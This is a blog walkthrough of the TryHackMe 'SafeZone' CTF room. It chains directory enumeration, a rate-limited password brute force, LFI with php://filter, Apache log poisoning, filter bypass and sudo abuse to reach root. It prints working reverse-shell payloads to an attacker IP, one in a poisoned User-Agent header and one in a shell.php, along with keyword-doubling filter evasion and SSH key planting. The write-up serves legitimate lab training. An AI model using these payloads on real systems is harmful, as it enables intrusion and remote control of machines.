---
layout: post
title: TryHackMe Walkthrough - SafeZone
date: 2021-07-27
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
- Machine
permalink: /2021/07/THM/SafeZone
img: 2021/07/SafeZone/SafeZone.png
---

This was a fun, but difficult room. I spent many days on it, especially on getting the initial foothold. I required lots of enumeration and exploiting different types of vulnerabilities.


* Room: SafeZone
* Difficulty: Medium
* URL: [https://tryhackme.com/room/safezone](https://tryhackme.com/room/safezone)
* Author: [golith3r00t](https://tryhackme.com/p/golith3r00t)

> CTF Designed by CTF lover for CTF lovers

## Enumeration

I started the room by adding the IP to my hosts file and using RustScan to enumerate the opened ports.

```bash
$ rustscan -a target  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.240.179:22
Open 10.10.240.179:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 16:34 EDT
Initiating Ping Scan at 16:34
Scanning 10.10.240.179 [2 ports]
Completed Ping Scan at 16:34, 0.23s elapsed (1 total hosts)
Initiating Connect Scan at 16:34
Scanning target (10.10.240.179) [2 ports]
Discovered open port 22/tcp on 10.10.240.179
Discovered open port 80/tcp on 10.10.240.179
Completed Connect Scan at 16:34, 0.23s elapsed (2 total ports)
Nmap scan report for target (10.10.240.179)
Host is up, received syn-ack (0.23s latency).
Scanned at 2021-07-09 16:34:23 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```

There was two opened ports, 22 (SSH) and 80 (HTTP). So I went directly to the web site.

## Web Site

I opened a web browser and navigate to the [site](http://target.thm/). There was nothing to see there.

![Main Page](/assets/images/2021/07/SafeZone/MainSite.png "Main Page")

I looked at the response in Burp, there was nothing hidden in the headers or the source code. So I launched Gobuster to look for hidden pages.


```bash
$ gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/07/09 16:34:30 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.hta                 (Status: 403) [Size: 275]
http://target.thm/.htaccess            (Status: 403) [Size: 275]
http://target.thm/.htpasswd            (Status: 403) [Size: 275]
http://target.thm/index.html           (Status: 200) [Size: 503]
http://target.thm/index.php            (Status: 200) [Size: 2372]
http://target.thm/server-status        (Status: 403) [Size: 275]

===============================================================
2021/07/09 16:35:10 Finished
===============================================================
```

It found that there are two index files. By default, the site served the `index.html`. So I looked at [index.php](http://target.thm/index.php). 

![Login Form](/assets/images/2021/07/SafeZone/IndexDotPHP.png "Login Form")

I tried login using admin/admin. It did not work, and the site did not give information about the user existing or not. 

However, it showed that there was rate limiting implemented on the login. 

![2 attempts remaining](/assets/images/2021/07/SafeZone/2AttemptsRemaining.png "2 attempts remaining")

After two more tries, I got a message saying I was blocked for 60 seconds. 

![Blocked](/assets/images/2021/07/SafeZone/Blocked.png "Blocked")

I would not be able to brute force that login form. Unless I find a way around the rate limiting. 

Now that I knew the site used PHP, I launched Gobuster again. This time I looked for PHP and text files. 

```bash
$ gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt -xtxt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/07/13 06:56:49 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.htpasswd            (Status: 403) [Size: 275]
http://target.thm/.htaccess            (Status: 403) [Size: 275]
http://target.thm/.htpasswd.php        (Status: 403) [Size: 275]
http://target.thm/.htaccess.txt        (Status: 403) [Size: 275]
http://target.thm/.htpasswd.txt        (Status: 403) [Size: 275]
http://target.thm/.htaccess.php        (Status: 403) [Size: 275]
http://target.thm/.hta                 (Status: 403) [Size: 275]
http://target.thm/.hta.php             (Status: 403) [Size: 275]
http://target.thm/.hta.txt             (Status: 403) [Size: 275]
http://target.thm/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
http://target.thm/detail.php           (Status: 302) [Size: 1103] [--> index.php]
http://target.thm/index.html           (Status: 200) [Size: 503]
http://target.thm/index.php            (Status: 200) [Size: 2372]
http://target.thm/index.php            (Status: 200) [Size: 2372]
http://target.thm/logout.php           (Status: 200) [Size: 54]
http://target.thm/news.php             (Status: 302) [Size: 922] [--> index.php]
http://target.thm/note.txt             (Status: 200) [Size: 121]
http://target.thm/register.php         (Status: 200) [Size: 2334]
http://target.thm/server-status        (Status: 403) [Size: 275]

===============================================================
2021/07/13 06:58:38 Finished
===============================================================
```

The first thing I looked at was the [note.txt file](http://target.thm/note.txt). 

> Message from admin :-
>
> I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .

Apparently a password is hidden in a file. But I had no access to it at this moment. 

There was a [register](http://target.thm/register.php) page. I created a new user and used it to connect to the site.

![Dashboard](/assets/images/2021/07/SafeZone/Dashboard.png "Dashboard")

Now that I was connected, I started looking around the site.

The [news page](http://target.thm/news.php) displayed a message about a possible [Local File Inclusion (LFI)](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) or [Remote Code Execution (RCE)](https://en.wikipedia.org/wiki/Arbitrary_code_execution) vulnerability. 

> ## I have something to tell you , it's about LFI or is it RCE or something else?

The [details pages](http://target.thm/detail.php) displayed a message about a feature being disabled. It looked like I might need an admin account to use it. 

![Details Page](/assets/images/2021/07/SafeZone/DetailsPage.png "Details Page")

In the page source code, a comment had an hint about a 'page' parameter that might help me. 

```html
<!-- try to use "page" as GET parameter-->
```

I tried using the parameter for LFI. I tried reading the [password file](http://target.thm/detail.php?page=/home/files/pass.txt) mentioned in the note. But the parameter did not seem to do anything.  

I also tried fuzzing this parameter, and other parameters. But I did not find anything interesting. 

```bash
$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 92 -t10 "http://target.thm/detail.php?page=FUZZ"

$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 92 -t10 "http://target.thm/detail.php?FUZZ=1"
```

## Admin Access 

I got stuck here for a few days. Only when I tried looking for hidden page with different lists than the two I normally use did I found something new. I really need to take all the unique words from those lists and combine them into one file.

```bash
$ gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -xtxt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/07/13 18:25:55 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/logout.php           (Status: 200) [Size: 54]
http://target.thm/register.php         (Status: 200) [Size: 2334]
http://target.thm/news.php             (Status: 302) [Size: 922] [--> index.php]
http://target.thm/index.php            (Status: 200) [Size: 2372]
http://target.thm/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
http://target.thm/detail.php           (Status: 302) [Size: 1103] [--> index.php]
http://target.thm/note.txt             (Status: 200) [Size: 121]
http://target.thm/server-status        (Status: 403) [Size: 275]
http://target.thm/index.php            (Status: 200) [Size: 2372]
http://target.thm/~files               (Status: 301) [Size: 309] [--> http://target.thm/~files/]

===============================================================
2021/07/13 18:50:42 Finished
===============================================================
```

I looked at the [/~files/](http://target.thm/~files/) folder Gobuster found. Directory indexing was on and it showed the [pass.txt](http://target.thm/~files/pass.txt) file mentioned in the earlier note. 

![~files](/assets/images/2021/07/SafeZone/IndexOfFiles.png "~files")

```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```

So the admin password was two times the word admin with two digits in between. That's gave me only 100 possibilities to brute force. 

I wrote a small Python script to generate all the numbers from 0 to 99. 

```python
for i in range(100):
    print("{:02d}".format(i))
```

And then I used wfuzz to try them all. However I still had the rate limiting issue to deal with. I first tried to wait 30 seconds between attempts, using the `-s` parameter. But that was too slow. Since I had three attempts before getting blocked for 60 seconds I thought I might get away with 20 seconds wait.

```bash
$ python generateNumbers.py > numbers.txt

$ wfuzz -c -z file,numbers.txt -t1 -s 20 -d "username=admin&password=adminFUZZadmin&submit=Submit" "http://target.thm/index.php"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target.thm/index.php
Total requests: 100

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        46 L     132 W      2430 Ch     "00"
000000002:   200        46 L     132 W      2430 Ch     "01"
000000003:   200        46 L     135 W      2428 Ch     "02"
000000004:   200        46 L     135 W      2428 Ch     "03"
000000005:   200        46 L     135 W      2428 Ch     "04"
000000006:   200        46 L     135 W      2428 Ch     "05"
...
0000000XX:   200        49 L     129 W      2445 Ch     "XX"
```

I used the password I found to connect as admin and went back to the details page. 

![Details As Admin](/assets/images/2021/07/SafeZone/DetailsAsAdmin.png "Details As Admin")

## Getting a Shell

The details page allowed me to run queries on the users. 

![whoami](/assets/images/2021/07/SafeZone/AdminWhoami.png "whoami")

I tried to do SQL Injection and command injection here, but it did not work. Then I remember the comment about the `page` parameter. I tried to load the index.html file with it and this time it worked. 

![LFI](/assets/images/2021/07/SafeZone/LFI.png "LFI")

Next I tried loading the [`/etc/passwd`](http://target.thm/detail.php?page=/etc/passwd) file.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```

This told me there was two users on the server: 'yash' and 'files'. I tried them in the Details page. 

![Yash](/assets/images/2021/07/SafeZone/YashWhoami.png "Yash")

The user files was not found. But yash was using their username as password. I used those credentials to log to the application. But that didn't give me anything more. I tried it to connect through SSH, but it failed.

Next, I used the LFI vulnerability to read the PHP files has base64. I couldn't include them like I did with the other files, because the PHP code would be executed and I would get the result of the execution, not the source code. But I was able to use PHP stream filters to get the code as base64.

Going to [http://target.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php](http://target.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php) gave me a long string, that I saved to a file and decoded to get the original code. 

```bash
$ cat detail.b64 | base64 -d > detail.php 
```

```php
<?php
$con=mysqli_connect("localhost","root","myrootpass","db");
session_start();
if(isset($_SESSION['IS_LOGIN']))
{
$is_admin=$_SESSION['isadmin'];
echo "<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2>";
echo "<br><br><br>";
if($is_admin==="true")
{
echo '<div style="align:center;" class="divf">';
echo '<form class="box" method="POST" style="text-align:center">';
echo '<input required AUTOCOMPLETE="OFF" style="text-align:center;" type="text" placeholder="user" name="name"><br><br>';
echo '<input type="submit" value="whoami" name="sub">';
echo '</form>';
echo '</div>';
if(isset($_GET["page"]))
{
		$page=$_GET["page"];
		$file = str_replace(array( "../", "..\"" ), "", $page );
		echo $file;
		include($file);
}
$formuser=mysqli_real_escape_string($con,$_POST['name']);
if(isset($_POST['sub']))
	{
		$sql="select * from user where username='$formuser'";
                $details = mysqli_fetch_assoc(mysqli_query($con,$sql));
		$det=json_encode($details);
		echo "<pre style='color:red;font-size:14px'>$det</pre>";
		$msg="Details are saved in a file";
		echo "<script>alert('details saved in a file')</script>";
	}
}
else
{
echo "<h3 style='color:red;text-align:center'>You can't access this feature!'</h3>";
}
}
else
{
header('Location: index.php');
}

?>
```

In the code, I could see that it read the users from the database. The username is escaped with `mysqli_real_escape_string` so it was not vulnerable to SQLi. 

The code was also doing an `include` of any file from the `page` parameter. So I tried to load the Apache access log to see if the page was vulnerable to [log poisoning](https://owasp.org/www-community/attacks/Log_Injection). 

I loaded [http://target.thm/detail.php?page=/var/log/apache2/access.log](http://target.thm/detail.php?page=/var/log/apache2/access.log) and the Apache logs were returned with the page. 

```
...
10.13.3.36 - - [26/Jul/2021:15:38:42 +0530] "GET /style.css HTTP/1.1" 404 452 "http://target.thm/detail.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.3.36 - - [26/Jul/2021:15:38:45 +0530] "GET /logout.php HTTP/1.1" 200 331 "http://target.thm/detail.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.3.36 - - [26/Jul/2021:15:38:46 +0530] "GET /index.php HTTP/1.1" 200 1113 "http://target.thm/logout.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.3.36 - - [26/Jul/2021:15:38:52 +0530] "POST /index.php HTTP/1.1" 200 1154 "http://target.thm/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.3.36 - - [26/Jul/2021:15:38:52 +0530] "GET /dashboard.php HTTP/1.1" 200 834 "http://target.thm/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.3.36 - - [26/Jul/2021:15:38:53 +0530] "GET /style.css HTTP/1.1" 404 452 "http://target.thm/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.3.36 - - [26/Jul/2021:15:42:22 +0530] "GET /detail.php?page=php://filter/convert.base64-encode/resource=detail.php HTTP/1.1" 200 2837 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.3.36 - - [26/Jul/2021:15:42:22 +0530] "GET /style.css HTTP/1.1" 404 452 "http://target.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

With that, I could change my request user agent to some PHP code and it would get executed on the second request. The first one to write it in the log file, and the second to execute it when the file would be included. 

I started a netcat listener and then used Burp Repeater to modify the user agent and send the request twice. 

```http
GET /detail.php?page=/var/log/apache2/access.log HTTP/1.1
Host: target.thm
User-Agent: <?php `mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`; ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=enaad3ebffto4lbui8og7pvlkb
Upgrade-Insecure-Requests: 1
```

On the second request, I had my reverse shell. 

```bash
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.95.156 57098
whoami
www-data
```

## Privilege Escalation to files

Once connected, I used Python to stabilize my shell. 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm

CTRL-z
stty raw -echo;fg
```

And then I started looking around on the server. The home folder for the user files was readable. I contained the password hint I had found earlier and password hash for the user files. 

```bash
www-data@safezone:/home$ ls -la /home/files/
total 40
drwxrwxrwx 5 files files 4096 Mar 29 04:10  .
drwxr-xr-x 4 root  root  4096 Jan 29 12:30  ..
-rw------- 1 files files    0 Mar 29 04:10  .bash_history
-rw-r--r-- 1 files files  220 Jan 29 12:30  .bash_logout
-rw-r--r-- 1 files files 3771 Jan 29 12:30  .bashrc
drwx------ 2 files files 4096 Jan 29 20:44  .cache
drwx------ 3 files files 4096 Jan 29 20:44  .gnupg
drwxrwxr-x 3 files files 4096 Jan 30 09:30  .local
-rw-r--r-- 1 files files  807 Jan 29 12:30  .profile
-rw-r--r-- 1 root  root   105 Jan 29 20:38 '.something#fake_can@be^here'
-rwxrwxrwx 1 root  root   112 Jan 29 10:24  pass.txt

www-data@safezone:/home/files$ cat pass.txt 
Admin password hint :-

                admin__admin

                                " __ means two numbers are there , this hint is enough I think :) "


www-data@safezone:/home$ cat /home/files/.something#fake_can\@be\^here 
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```

I launched hashcat to try to crack the password.

```bash
$ hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...     
                                                          
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================

...

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.:REDACTED
                                                  
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIH...rvVbc.
Time.Started.....: Wed Jul 14 06:23:24 2021 (4 secs)
Time.Estimated...: Wed Jul 14 06:23:28 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) 
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      671 H/s (12.31ms) @ Accel:24 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2688/14344385 (0.02%)
Rejected.........: 0/2688 (0.00%)
Restore.Point....: 2640/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidates.#1....: cartoon -> nugget

Started: Wed Jul 14 06:23:23 2021
Stopped: Wed Jul 14 06:23:30 2021
```

It found the password quickly, but I was still looking around the server for ways to escalate. The user www-data was allowed to run `find` as files. 

```bash
www-data@safezone:/home$ sudo -l
Matching Defaults entries for www-data on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User www-data may run the following commands on safezone:
    (files) NOPASSWD: /usr/bin/find
```

I looked on GTFOBins, and it gave me an easy way to [escalate to files](https://gtfobins.github.io/gtfobins/find/#sudo). 

```
www-data@safezone:/home$ sudo -u files find . -exec /bin/sh \; -quit
$ whoami
files
```


## Privilege Escalation to yash

After I connected as files, I try looking for ways to escalate my privileges again. I check for sudo permissions. They could run `id` as yash. But this didn't look really useful. 

```bash
files@safezone:~$ sudo -l
Matching Defaults entries for files on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id

files@safezone:~$ sudo -u yash id
uid=1000(yash) gid=1000(yash) groups=1000(yash),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),114(sambashare)
```

I looked around the server for a while. When I looked for opened ports locally I found a second web application on port 8000.


```bash
files@safezone:~$ ss -l
Netid  State    Recv-Q   Send-Q                                   Local Address:Port                                            Peer Address:Port               
...
tcp    LISTEN   0        128                                          127.0.0.1:8000                                                 0.0.0.0:*                  
```

I tried to get the site, but it was not accessible. 

```bash
files@safezone:~$ curl localhost:8000
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

I opened a SSH tunnel to be able to interact with this page from my machine.

```bash
ssh -L 8000:localhost:8000 files@target
```

Then I could use Gobuster to look for hidden pages.

```bash
$ gobuster dir -e -u http://localhost:8000/ -t30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -xtxt,php                                                                
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8000/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/07/15 06:36:09 Starting gobuster in directory enumeration mode
===============================================================
http://localhost:8000/pentest.php          (Status: 200) [Size: 195]
                                                                    
===============================================================
2021/07/15 08:18:11 Finished
===============================================================
```

There was only one page opened, [pentest.php](http://localhost:8000/pentest.php). 

![pentest.php](/assets/images/2021/07/SafeZone/Pentest.png "pentest.php")

The page requested a message to send to Yash and echoed it back to me. I played with the message for a while, trying to send commands to the server. From what the page returned me, it was clear that many things were stripped out from the message I sent. 

* php
* nc
* (
* )
* &
* \`

For things like php and nc, I found that if I double them, they would not be completely stripped. 

Sending 
```
<?pphphp system('mkfifo /tmp/kirxhbg; nncc 10.13.3.36 4444 0</tmp/kirxhbg | /bbinin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg'); ?>
```

Returned
```
<?php system'mkfifo /tmp/kirxhbg nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>1 rm /tmp/kirxhbg' ?>
```

But I could not do this for single characters like &. And I did not get a reverse shell with this. 

Also, I did not know if the message I was sending was being executed on the server. And if it was, did I need to pass PHP, or Bash commands?

I tried creating a file where I would be able to read it to see if bash commands worked.

I tried sending this message:
```
touch /home/files/test
```

Then looked in files home folder. The file was there. 
```bash
files@safezone:~$ ls -l /home/files
total 4
-rwxrwxrwx 1 root root 112 Jan 29 10:24 pass.txt
-rw-r--r-- 1 yash yash   0 Jul 27 15:53 test
```

Now that I knew that Bash command worked, I used it to copy pentest.php where I would be able to read it. 

```bash
cp pentest.pphphp /home/files
```

Nothing surprising in the file. It takes the message sent, remove a bunch of things and then execute it.

```php
<?php

if(isset($_POST['btn']))
{
$substitutions = array(
		'&&' => '',
		';'  => '',
		'bash' => '',
		'tcp' => '',
		'dev' => '',
		'php' => '',
		'python' => '',
		'python3' => '',
		'socat' => '',
		'perl' => '',
		'ruby' => '',
		'nc' => '',
		'ncat' => '',
		'Run' => '',
		'powershell' => '',
		'&'  => '',
		';'  => '',
		'$'  => '',
		'('  => '',
		')'  => '',
		'`'  => '',
		'||' => '',
		'bin' => '',
		'id' => '',
		'whoami' => ''
	);


$msg=$_POST['msg'];
$target = str_replace( array_keys( $substitutions ), $substitutions, $msg );
echo "<pre style='color:red'>$target</pre>";
shell_exec($target);
}
?>
```

Next I tried to create a PHP reverse shell in files home folder.

```bash
files@safezone:~$ cat shell.php 
<?php
`mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`;

```

And then use this message to copy it in the web root so I could execute it. 
```
cp /home/files/shell.pphphp /opt/
```

But the web server was running as yash and they were not allowed to write to `/opt` so that failed. 

But since it was running as yash, it meant I could use it to write into yash home folder. I created a file `/home/files/authorized_keys` with my public key. And then used the web page to copy it in `/home/yash/.ssh/`.

```
mkdir ~/.ssh

cp /home/files/authorized_keys /home/yash/.ssh/

chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

When this was done, I was able to connect as yash with SSH and finally get the first flag.

```bash
$ ssh yash@target
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-140-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul 16 16:09:16 IST 2021

  System load:  0.0                Processes:           103
  Usage of /:   12.3% of 39.45GB   Users logged in:     1
  Memory usage: 25%                IP address for eth0: 10.10.120.71
  Swap usage:   0%


0 packages can be updated.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan 29 09:17:38 2021
yash@safezone:~$ cat flag.txt 
REDACTED
```

## Escalation to root

As always, I started looking at sudo permission. 

```
$ sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

yash was able to run some backup script as root. I tried the script. It requested a filename, a destination, and a password. I tried using it to copy a file to yash's home folder and it worked. 

```
yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /etc/passwd
Enter destination: /home/yash
Enter Password: 123
yash@safezone:~$ ls -la
total 52
drwx------ 6 yash yash 4096 Jul 17 01:22 .
drwxr-xr-x 4 root root 4096 Jan 29 12:30 ..
-rw------- 1 yash yash    5 Mar 29 05:13 .bash_history
-rw-r--r-- 1 yash yash  220 Jan 29 09:08 .bash_logout
-rw-r--r-- 1 yash yash 3771 Jan 29 09:08 .bashrc
drwx------ 2 yash yash 4096 Jan 29 09:17 .cache
-rw-rw-r-- 1 yash yash   38 Jan 30 15:24 flag.txt
drwx------ 3 yash yash 4096 Jan 29 09:17 .gnupg
drwxrwxr-x 3 yash yash 4096 Jan 29 22:16 .local
-rw-r--r-- 1 root root 1658 Jul 17 01:22 passwd
-rw-r--r-- 1 yash yash  807 Jan 29 09:08 .profile
drwx------ 2 yash yash 4096 Jul 17 01:15 .ssh
-rw------- 1 yash yash  733 Jul 17 01:17 .viminfo

yash@safezone:~$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

Since it ran as root, I used it to copy the flag.
```
yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/flag.txt 
Enter destination: /home/yash
Enter Password: 111

yash@safezone:~$ ls -ltr
total 8
-rw-rw-r-- 1 yash yash   38 Jan 30 15:24 flag.txt
-rw-r--r-- 1 root root 1658 Jul 17 01:22 passwd

yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/root.txt
Enter destination: /home/yash
Enter Password: 111

yash@safezone:~$ ls -ltrh
total 12K
-rw-rw-r-- 1 yash yash   38 Jan 30 15:24 flag.txt
-rw-r--r-- 1 root root 1.7K Jul 17 01:22 passwd
-rw-r--r-- 1 root root   38 Jul 17 01:24 root.txt

yash@safezone:~$ cat root.txt 
REDACTED
```

This room took me a long time to complete. I got stuck a few times, but I had lots of fun doing it.